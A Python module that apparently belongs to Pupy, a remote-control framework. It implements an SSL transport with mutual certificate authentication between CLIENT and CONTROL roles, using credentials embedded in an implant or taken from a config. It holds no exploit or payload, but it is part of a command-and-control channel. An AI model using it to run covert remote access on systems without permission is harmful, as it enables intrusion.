# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of
# the project for the detailed licence terms

import os
import tempfile

from network.lib import PupyTCPServer, PupySocketStream
from network.lib import DummyPupyTransport, PupySSLClient
from network.transports import Transport

import sys
import ssl

from rpyc.utils.authenticators import AuthenticationError

class PupySSLAuthenticator(object):
    def __init__(self, role, keystr, certstr, castr, client_cert_required=True):
        self.keystr = keystr.strip()
        self.certstr = certstr.strip()
        self.castr = castr.strip()
        self.ciphers = 'HIGH:!aNULL:!MD5:!RC4:!3DES:!DES:!AES128@STRENGTH'
        self.client_cert_required = client_cert_required
        self.cert_reqs = ssl.CERT_REQUIRED \
          if self.client_cert_required else ssl.CERT_OPTIONAL
        self.ssl_version = ssl.PROTOCOL_SSLv23
        self.ROLE = role

    def __call__(self, sock):
        wrapped_socket = None
        tmp_cert_path = None
        tmp_key_path = None
        tmp_ca_path = None

        fd_cert_path, tmp_cert_path = tempfile.mkstemp()
        fd_key_path, tmp_key_path = tempfile.mkstemp()
        fd_ca_path, tmp_ca_path = tempfile.mkstemp()

        os.write(fd_cert_path, self.certstr)
        os.close(fd_cert_path)
        os.write(fd_key_path, self.keystr)
        os.close(fd_key_path)
        os.write(fd_ca_path, self.castr)
        os.close(fd_ca_path)

        exception = None

        try:
            wrapped_socket = ssl.wrap_socket(
                sock,
                keyfile=tmp_key_path,
                certfile=tmp_cert_path,
                ca_certs=tmp_ca_path,
                server_side=True,
                cert_reqs=self.cert_reqs,
                ssl_version=self.ssl_version,
                ciphers=self.ciphers
            )
        except ssl.SSLError:
            exception = sys.exc_info()[1]

        finally:
            os.unlink(tmp_cert_path)
            os.unlink(tmp_key_path)
            os.unlink(tmp_ca_path)

        if exception:
            raise AuthenticationError(str(exception))

        peer = wrapped_socket.getpeercert()
        peer_role = ''

        if self.client_cert_required:
            for (item) in peer['subject']:
                if item[0][0] == 'organizationalUnitName':
                    peer_role = item[0][1]

            if not (self.ROLE == 'CLIENT' and peer_role == 'CONTROL' or \
              self.ROLE == 'CONTROL' and peer_role == 'CLIENT'):
                raise AuthenticationError('Invalid peer role: {}'.format(peer_role))

        return wrapped_socket, peer

def ssl_authenticator():
    keystr = b''
    certstr = b''
    client_cert_required = True

    try:
        import pupy_credentials
        keystr = pupy_credentials.SSL_BIND_KEY
        certstr = pupy_credentials.SSL_BIND_CERT
        castr = pupy_credentials.SSL_CA_CERT
        role = 'CLIENT'

    except ImportError:
        from pupylib.PupyConfig import PupyConfig
        from pupylib.PupyCredentials import Credentials

        config = PupyConfig()
        credentials = Credentials()

        client_cert_required = config.getboolean('ssl', 'client_cert_required')

        keystr = credentials['SSL_BIND_KEY']
        certstr = credentials['SSL_BIND_CERT']
        castr = credentials['SSL_CA_CERT']

        role = credentials.role

    return PupySSLAuthenticator(
        role, keystr, certstr, castr,
        client_cert_required=client_cert_required
    )


class TransportConf(Transport):
    info = "TCP transport wrapped with SSL"
    name = "ssl"
    server = PupyTCPServer
    client = PupySSLClient
    stream=PupySocketStream
    client_transport=DummyPupyTransport
    server_transport=DummyPupyTransport
    credentials = [
        'SSL_CA_CERT',
        'SSL_BIND_KEY', 'SSL_BIND_CERT',
        'SSL_CLIENT_KEY', 'SSL_CLIENT_CERT'
    ]

    def authenticator(self):
        return ssl_authenticator()
